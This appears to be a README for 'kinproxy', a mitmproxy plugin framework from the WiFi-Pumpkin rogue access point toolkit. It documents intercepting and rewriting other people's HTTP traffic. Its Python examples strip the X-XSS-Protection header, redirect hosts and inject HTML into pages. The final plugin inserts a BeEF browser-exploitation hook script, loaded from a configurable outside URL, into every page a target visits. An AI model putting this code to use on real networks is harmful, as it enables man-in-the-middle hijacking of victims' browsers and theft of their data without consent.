# kinproxy

my implements transparent proxies (mitmproxy) can use to intercept and manipulate HTTP traffic modifying requests and responses.

## Instalation

``` sh
$ sudo apt-get update
$ sudo apt-get install -y python-pip libffi-dev
$ libssl-dev libxml2-dev libxslt1-dev zlib1g-dev
$ sudo apt-get install -y python-qt4
$ sudo apt-get install -y python-dev git
$ sudo apt-get install -y libpcap-dev
$ sudo pip install -r requirements.txt
$ sudo pip install mitmproxy==0.18.2
```

 Transparent proxies(mitmproxy) that you can use to intercept and manipulate HTTP traffic modifying requests and responses, that allow to inject javascripts into the targets visited.  You can easily implement a module to inject data into pages creating a python file in directory "plugins/" automatically will be loaded.
#### Plugins Example Dev

 ``` python
from mitmproxy.models import decoded # for decode content html
from plugins.extension.plugin import PluginTemplate

class Nameplugin(PluginTemplate):
    meta = {
        'Name'      : 'Nameplugin',
        'Version'   : '1.0',
        'Description' : 'Brief description of the new plugin',
        'Author'    : 'by dev'
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        # if you want set arguments check refer wiki more info.
        self.ConfigParser = False # No require arguments

    def request(self, flow):
        print flow.__dict__
        print flow.request.__dict__
        print flow.request.headers.__dict__ # request headers
        host = flow.request.pretty_host # get domain on the fly requests
        versionH = flow.request.http_version # get http version

        # get redirect domains example
        # pretty_host takes the "Host" header of the request into account,
        if flow.request.pretty_host == "example.org":
            flow.request.host = "mitmproxy.org"

        # get all request Header example
        self.send_output.emit("\n[{}][HTTP REQUEST HEADERS]".format(self.Name))
        for name, valur in flow.request.headers.iteritems():
            self.send_output.emit('{}: {}'.format(name,valur))

        print flow.request.method # show method request
        # the model printer data
        self.send_output.emit('[NamePlugin]:: this is model for save data logging')

    def response(self, flow):
        print flow.__dict__
        print flow.response.__dict__
        print flow.response.headers.__dict__ #convert headers for python dict
        print flow.response.headers['Content-Type'] # get content type

        #every HTTP response before it is returned to the client
        with decoded(flow.response):
            print flow.response.content # content html
            flow.response.content.replace('</body>','<h1>injected</h1></body>') # replace content tag

        del flow.response.headers["X-XSS-Protection"] # remove protection Header

        flow.response.headers["newheader"] = "foo" # adds a new header
        #and the new header will be added to all responses passing through the proxy
```

### Overview
First of all write the import plugin tamplate
``` python
from plugins.extension.plugin import PluginTemplate
```
the basic plugin example:
``` python
from plugins.extension.plugin import PluginTemplate


class Example(PluginTemplate):
    meta = {
        'Name'      : 'exampleplugin',
        'Version'   : '1.0',
        'Description' : 'description of plugin',
        'Author'    : 'by dev Name',
    }

    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = False # requeire args

    def request(self, flow): # get all request HTTP traffic
        pass

    def response(self, flow): # get all response HTTP traffic
        pass
```

### Modify Packets
Simple fuctions that just adds a header to every request..
 ``` python
    def response(self, flow):
        flow.response.headers["newheader"] = "foo" # adds a new header
```

example from mitmproxy how to redirect connections (IP spoofing)
 ``` python
    def request(self, flow):
        if flow.client_conn.ssl_established:
            flow.request.scheme = "https"
            sni = flow.client_conn.connection.get_servername()
            port = 443
        else:
            flow.request.scheme = "http"
            sni = None
            port = 80

        host_header = flow.request.pretty_host
        m = parse_host_header.match(host_header)
        if m:
            host_header = m.group("host").strip("[]")
            if m.group("port"):
                port = int(m.group("port"))

        flow.request.host = sni or host_header
        flow.request.port = port
```

another example how to rewrite packet in real time
 ``` python
from mitmproxy.models import decoded # for decode content html
from plugins.extension.plugin import PluginTemplate

class Nameplugin(PluginTemplate):
    meta = {
        'Name'      : 'Nameplugin',
        'Version'   : '1.0',
        'Description' : 'Brief description of the new plugin',
        'Author'    : 'by dev'
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        # if you want set arguments check refer wiki more info.
        self.ConfigParser = False # No require arguments

    def request(self, flow):
        print flow.__dict__
        print flow.request.__dict__
        print flow.request.headers.__dict__ # request headers
        host = flow.request.pretty_host # get domain on the fly requests
        versionH = flow.request.http_version # get http version

        # get redirect domains example
        # pretty_host takes the "Host" header of the request into account,
        if flow.request.pretty_host == "example.org":
            flow.request.host = "mitmproxy.org"

        # get all request Header example
        self.send_output.emit("\n[{}][HTTP REQUEST HEADERS]".format(self.Name))
        for name, valur in flow.request.headers.iteritems():
            self.send_output.emit('{}: {}'.format(name,valur))

        print flow.request.method # show method request
        # the model printer data
        self.send_output.emit('[NamePlugin]:: this is model for save data logging')

    def response(self, flow):
        print flow.__dict__
        print flow.response.__dict__
        print flow.response.headers.__dict__ #convert headers for python dict
        print flow.response.headers['Content-Type'] # get content type

        #every HTTP response before it is returned to the client
        with decoded(flow.response):
            print flow.response.content # content html
            flow.response.content.replace('</body>','<h1>injected</h1></body>') # replace content tag

        del flow.response.headers["X-XSS-Protection"] # remove protection Header

        flow.response.headers["newheader"] = "foo" # adds a new header
        #and the new header will be added to all responses passing through the proxy
```

### Logging
if you want to save data(pumpkin-prxoy.log) in your plugin, just use self.send_output.emit('msg here')
 ``` python
    def request(self, flow):
        self.send_output.emit('[example]:: this is hellow WiFi-Pumpkin')
```
### How to add argumments
Now, if you want to add argumments in proxy.ini, you need to add in directory "core/pumpkinProxy.ini" the key (exampleplugin and set_exampleplugin).

* exampleplugin key is the option checkbox to change and enable or disable plugin
* set_exampleplugin this is key for search all argumments in Settings option.
![plugin_key](http://i.imgur.com/oSvErrZ.png)

### Example from WiFi-Pumpkin with Argummets
``` python
class beef(PluginTemplate):
    meta = {
        'Name'      : 'beef',
        'Version'   : '1.0',
        'Description' : 'this module proxy inject hook beef api url.[Hook URL]',
        'Author'    : 'Marcos Nesster'
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.urlhook = self.config.get_setting('set_beef','hook')

    def request(self, flow):
        pass

    def response(self,flow):
        with decoded(flow.response):  # Remove content encoding (gzip, ...)
            html = BeautifulSoup(flow.response.content)
            """
            # To Allow CORS
            if "Content-Security-Policy" in flow.response.headers:
                del flow.response.headers["Content-Security-Policy"]
            """
            if html.body:
                script = html.new_tag(
                    'script',
                    src=self.urlhook)
                html.body.insert(0, script)
                flow.response.content = str(html)
                self.send_output.emit("[{}] Injected BeFF url hook...".format(self.Name))
```
